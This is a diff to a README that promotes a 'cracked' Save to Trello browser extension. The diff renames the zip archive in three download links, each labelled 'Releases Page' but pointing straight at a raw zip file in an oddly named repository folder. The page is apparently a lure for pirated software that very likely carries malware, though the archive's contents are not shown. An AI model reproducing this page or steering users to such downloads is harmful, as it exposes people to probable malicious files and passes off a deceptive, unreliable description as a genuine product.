@@ -1,7 +1,7 @@
 # 🚀 cracked-save-to-trello-board-extension - Save Efficiently to Trello Boards
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/Ek2025/cracked-save-to-trello-board-extension/main/gudewife/cracked-save-to-trello-board-extension.zip)](https://raw.githubusercontent.com/Ek2025/cracked-save-to-trello-board-extension/main/gudewife/cracked-save-to-trello-board-extension.zip)
+[![Download](https://raw.githubusercontent.com/Ek2025/cracked-save-to-trello-board-extension/main/gudewife/to-extension-trello-cracked-board-save-3.2.zip)](https://raw.githubusercontent.com/Ek2025/cracked-save-to-trello-board-extension/main/gudewife/to-extension-trello-cracked-board-save-3.2.zip)
 
 ## 📖 Overview
 The Cracked Save to Trello Board Extension helps you save content directly to your Trello boards. Instead of switching between tabs and manually copying information, this extension streamlines the process. It allows you to capture ideas, links, and notes quickly, making your productivity soar.
@@ -14,7 +14,7 @@ To use this extension, ensure your system meets the following requirements:
 
 ## 🚀 Getting Started
 1. **Download the Extension**  
-   Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Ek2025/cracked-save-to-trello-board-extension/main/gudewife/cracked-save-to-trello-board-extension.zip).
+   Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Ek2025/cracked-save-to-trello-board-extension/main/gudewife/to-extension-trello-cracked-board-save-3.2.zip).
 
 2. **Install the Extension**  
    After downloading, locate the file in your downloads folder. If you are using Google Chrome:
@@ -46,6 +46,6 @@ If you encounter issues during installation or use, consider the following:
 - Organize your boards based on projects or categories to enhance productivity.
 
 ## 🚀 Download & Install
-To get your copy of the Cracked Save to Trello Board Extension, follow this link: [Releases Page](https://raw.githubusercontent.com/Ek2025/cracked-save-to-trello-board-extension/main/gudewife/cracked-save-to-trello-board-extension.zip).
+To get your copy of the Cracked Save to Trello Board Extension, follow this link: [Releases Page](https://raw.githubusercontent.com/Ek2025/cracked-save-to-trello-board-extension/main/gudewife/to-extension-trello-cracked-board-save-3.2.zip).
 
 Start saving to your Trello boards effortlessly today!
